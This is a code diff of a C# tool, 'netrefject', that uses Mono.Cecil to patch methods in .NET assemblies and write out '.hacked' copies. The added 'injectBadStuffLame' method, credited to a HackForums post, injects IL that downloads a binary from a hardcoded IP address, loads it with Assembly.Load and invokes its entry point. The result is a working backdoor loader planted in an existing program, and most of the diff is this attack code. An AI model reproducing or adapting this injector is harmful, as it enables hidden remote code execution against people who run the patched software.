@@ -1,12 +1,12 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Text;
 using System.Reflection;
 using System.Linq;
 
 //Payload usings
 using System.IO;
 using System.Net.Sockets;
+using System.Net;
 
 using Mono.Cecil;
 using Mono.Cecil.Cil;
@@ -116,7 +116,8 @@ namespace netrefject
                 Console.WriteLine("\tClass:" + internalModuleTypes[classNumber].FullName);
                 Console.WriteLine("\tMethod:" + internalMethods[methodNumber].Name);
 
-                injectBadStuff(internalModules[moduleNumber], internalModuleTypes[classNumber], internalMethods[methodNumber]);
+                injectBadStuffLame(internalModules[moduleNumber], internalModuleTypes[classNumber], internalMethods[methodNumber]);
+                //injectBadStuff(internalModules[moduleNumber], internalModuleTypes[classNumber], internalMethods[methodNumber]);
             }
             catch(Exception e)
             {
@@ -142,6 +143,163 @@ namespace netrefject
         #endregion
 
 
+        //This is from HackForums by a guy called TheBigDamnGa
+        //https://hackforums.net/showthread.php?tid=5924760
+        private bool injectBadStuffLame(Module moduleT, Type classT, MethodInfo methodT){
+            AssemblyDefinition targetAsm = AssemblyDefinition.ReadAssembly(moduleT.Assembly.Location);
+            TypeDefinition targetType = targetAsm.MainModule.Types.FirstOrDefault(e => e.Name == classT.Name);
+            MethodDefinition m1 = targetType.Methods.FirstOrDefault(x => x.Name == methodT.Name);
+
+            // Initialize References
+            References refs = new References();
+            refs.uint8 = targetAsm.MainModule.ImportReference(typeof(byte[]));
+            refs.Assembly = targetAsm.MainModule.ImportReference(typeof(Assembly));
+            refs.MethodInfo = targetAsm.MainModule.ImportReference(typeof(MethodInfo));
+            refs.var = targetAsm.MainModule.ImportReference(typeof(object));
+            refs.boolean = targetAsm.MainModule.ImportReference(typeof(bool));
+            refs.var_array = targetAsm.MainModule.ImportReference(typeof(object[]));
+            refs.int32 = targetAsm.MainModule.ImportReference(typeof(int));
+            refs.Exception = targetAsm.MainModule.ImportReference(typeof(Exception));
+
+            refs.WebClientCtor = targetAsm.MainModule.ImportReference(typeof(WebClient).GetConstructor(new Type[] { }));
+            refs.WebClient_DownloadData = targetAsm.MainModule.ImportReference(typeof(WebClient).GetMethod("DownloadData", new Type[] { typeof(string) }));
+
+            refs.Assembly_Load = targetAsm.MainModule.ImportReference(typeof(Assembly).GetMethod("Load", new Type[] { typeof(sbyte[]) }));
+            refs.Assembly_getEntryPoint = targetAsm.MainModule.ImportReference(typeof(Assembly).GetMethod("get_EntryPoint", new Type[] { }));
+            refs.Assembly_CreateInstance = targetAsm.MainModule.ImportReference(typeof(Assembly).GetMethod("CreateInstance", new Type[] { typeof(string) }));
+
+            refs.MemberInfo_getName = targetAsm.MainModule.ImportReference(typeof(MemberInfo).GetMethod("get_Name", new Type[] { }));
+
+            refs.MethodBase_GetParameters = targetAsm.MainModule.ImportReference(typeof(MethodBase).GetMethod("GetParameters", new Type[] { }));
+            refs.MethodBase_Invoke = targetAsm.MainModule.ImportReference(typeof(MethodBase).GetMethod("Invoke", new Type[] { typeof(object), typeof(object[]) }));
+
+            // Insert Variables
+            m1.Body.Variables.Insert(0, new VariableDefinition(refs.uint8));
+            m1.Body.Variables.Insert(1, new VariableDefinition(refs.Assembly));
+            m1.Body.Variables.Insert(2, new VariableDefinition(refs.MethodInfo));
+            m1.Body.Variables.Insert(3, new VariableDefinition(refs.var));
+            m1.Body.Variables.Insert(4, new VariableDefinition(refs.boolean));
+            m1.Body.Variables.Insert(5, new VariableDefinition(refs.var_array));
+            m1.Body.Variables.Insert(6, new VariableDefinition(refs.int32));
+            m1.Body.Variables.Insert(7, new VariableDefinition(refs.boolean));
+
+            var Var_4 = m1.Body.Variables.ElementAt(4);
+            var Var_5 = m1.Body.Variables.ElementAt(5);
+            var Var_6 = m1.Body.Variables.ElementAt(6);
+            var Var_7 = m1.Body.Variables.ElementAt(7);
+
+            // Instructions
+            Instruction NOP_0x48 = Instruction.Create(OpCodes.Nop);
+            Instruction NOP_0x88 = Instruction.Create(OpCodes.Nop);
+            Instruction NOP_0x5D = Instruction.Create(OpCodes.Nop);
+            Instruction POP_0x8B = Instruction.Create(OpCodes.Pop);
+            Instruction LDLOC_0x6B = Instruction.Create(OpCodes.Ldloc_S, Var_6);
+            Instruction RET_0x90 = Instruction.Create(OpCodes.Ret);
+
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Nop));
+
+            ExceptionHandler handler = new ExceptionHandler(ExceptionHandlerType.Catch)
+            {
+                TryStart = m1.Body.Instructions.ElementAt(1),
+                TryEnd = POP_0x8B,
+                HandlerStart = POP_0x8B,
+                HandlerEnd = RET_0x90,
+                CatchType = refs.Exception
+            };
+
+            m1.Body.ExceptionHandlers.Add(handler);                
+
+            // Try
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Nop));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Newobj, refs.WebClientCtor));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldstr, "http://10.20.29.137/HELLOWORLD")); // URL_OF_EXE
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Call, refs.WebClient_DownloadData));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_0));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_0));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Call, refs.Assembly_Load));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_1));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_1));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.Assembly_getEntryPoint));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_2));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_1));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_2));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.MemberInfo_getName));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.Assembly_CreateInstance));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_3));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_2));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.MethodBase_GetParameters));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldlen));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldc_I4_0));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ceq));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_S, Var_4));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_S, Var_4));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Brfalse_S, NOP_0x48));
+
+            // If
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_2));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_3));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldnull));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.MethodBase_Invoke));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Pop));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Br_S, NOP_0x88));
+
+            // Else
+            m1.Body.Instructions.Add(NOP_0x48);
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_2));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.MethodBase_GetParameters));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldlen));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Conv_I4));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Newarr, refs.var));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_S, Var_5));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldc_I4_0));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_S, Var_6));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Br_S, LDLOC_0x6B));
+            m1.Body.Instructions.Add(NOP_0x5D);
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_S, Var_5));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_S, Var_6));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldnull));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stelem_Ref));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Nop));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_S, Var_6));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldc_I4_1));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Add));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_S, Var_6));
+
+            // For-Loop
+            m1.Body.Instructions.Add(LDLOC_0x6B);
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_2));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.MethodBase_GetParameters));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldlen));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Conv_I4));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Clt));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_S, Var_7));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_S, Var_7));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Brtrue_S, NOP_0x5D));
+
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_2));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_3));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_S, Var_5));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.MethodBase_Invoke));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Pop));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Nop));
+            m1.Body.Instructions.Add(NOP_0x88);
+
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Leave_S, RET_0x90));
+
+            // Catch
+            m1.Body.Instructions.Add(POP_0x8B);
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Nop));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Nop));
+            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Leave_S, RET_0x90));
+
+            // Return
+            m1.Body.Instructions.Add(RET_0x90);
+
+            targetAsm.Write(moduleT.Assembly.FullName + ".hacked");
+
+            return new Random(DateTime.Now.Millisecond).Next() > (DateTime.Now.Millisecond/2);
+        }
+
         /// <summary>
         /// Cecil code with thanks from Hopeless
         /// https://stackoverflow.com/questions/46052447/replace-methods-body-with-body-of-another-method-using-mono-cecil
@@ -163,26 +321,26 @@ namespace netrefject
 
             ILProcessor ilp = m1.Body.GetILProcessor();
             int originaInstructionCount = m1.Body.Instructions.Count;
-
-            //importEvilMethodClasses(m1);
-            //m1.Module.Import(typeof(Console).GetMethod("WriteLine",new[] {typeof(string)}));
             
+
             for (int i = 0; i < originaInstructionCount; i++)
             {
                 if (m1.Body.Instructions[i].OpCode == OpCodes.Ret)
                 {
                     Instruction retCall = m1.Body.Instructions[i];
-                    int instructionCounter = 0;
-                    Instruction[] instructions = getEvilInstructions();
+                    MethodDefinition sourceMethodDefinition = getEvilMethodBody();
+                    Instruction[] instructions = sourceMethodDefinition.Body.Instructions.ToArray();
+
                     for (int iI = 0;iI<instructions.Length;iI++)
-                    //foreach (Instruction ei in getEvilInstructions())
                     {
                         if (instructions[iI].OpCode.Code != Code.Ret)
                         {
                             //If it's a call, we need to find out which method is called and import that method on the fly
                             if (instructions[iI].OpCode.Code == Code.Call){
-                                var call = ilp.Create (OpCodes.Call, getMethodImportBasedOnOperand(instructions[iI],m1));
+                                //var call = ilp.Create (OpCodes.Call, getMethodImportBasedOnOperand(instructions[iI],targetAsm.MainModule).Resolve());
+                                var call = ilp.Create (OpCodes.Call, getMethodImportBasedOnOperand(instructions[iI], sourceMethodDefinition.Module.Assembly.MainModule).Resolve());
                                 ilp.InsertBefore(retCall,call);
+                                //ilp.InsertBefore(retCall,hackConsoleWriteLine);
                             }
                             else
                                 ilp.InsertBefore(retCall,instructions[iI]);
@@ -193,22 +351,24 @@ namespace netrefject
 
             Console.WriteLine("Instructions After:" + m1.Body.Instructions.Count.ToString());
 
-            //finally write to another output assembly
+            //finally write to another output assembly    
+            //targetAsm.MainModule.AssemblyReferences.RemoveAt(1);    
+            //targetAsm.MainModule.AssemblyReferences.RemoveAt(1);
             targetAsm.Write(moduleT.Assembly.FullName + ".hacked");
 
             return true;
         }
 
-        private Instruction[] getEvilInstructions()
+        private MethodDefinition getEvilMethodBody()
         {
             AssemblyDefinition sourceAsm = AssemblyDefinition.ReadAssembly(Assembly.GetExecutingAssembly().Location);
             TypeDefinition targetType = sourceAsm.MainModule.Types.FirstOrDefault(e => e.Name == "Worker");
             MethodDefinition m1 = targetType.Methods.FirstOrDefault(x => x.Name == "evilMethod");
             Console.WriteLine("Evil Instruction Count:" + m1.Body.Instructions.Count.ToString());
-            return m1.Body.Instructions.ToArray();
+            return m1;
         }
 
-        private MethodReference getMethodImportBasedOnOperand (Instruction i, MethodDefinition m1){
+        private MethodReference getMethodImportBasedOnOperand (Instruction i, ModuleDefinition m1){
             MethodReference md = null;
             if (methods.Count == 0){
                 methods = populateMethodReferences(m1);
@@ -219,14 +379,16 @@ namespace netrefject
             return md;
         }
 
-        private Dictionary<string,MethodReference> populateMethodReferences(MethodDefinition m1){
+        private Dictionary<string,MethodReference> populateMethodReferences(ModuleDefinition m1){
             Dictionary<string,MethodReference> methodRefs = new Dictionary<string, MethodReference>();
             MethodReference mref = null;
 
             //Mui Importante: Import all your function references for your evilMethod here
-            mref = m1.Module.Import(typeof(Console).GetMethod("WriteLine",new[] {typeof(string)}));
+            //mref = m1.ImportReference(typeof(Console).GetMethod("WriteLine",new[] {typeof(object)}));
+            mref = m1.ImportReference(typeof(Console).GetMethod("WriteLine",new[] {typeof(string)}));
             methodRefs.Add(mref.ToString(),mref);
 
+            /*
             //TcpListener Constructor
             mref = m1.Module.Import(typeof(TcpListener).GetConstructor(
                 new[] {
@@ -311,14 +473,14 @@ namespace netrefject
                     typeof(Object[])
                 }
             ));
-            methodRefs.Add(mref.FullName,mref);
+            methodRefs.Add(mref.FullName,mref);*/
 
             return methodRefs;
         }
 
         private void evilMethod()
         {
-            Console.WriteLine("[!!] I am evilMethod starting");
+            System.Console.WriteLine("[!!] I am evilMethod starting");
             
             var hello = "hello";
 
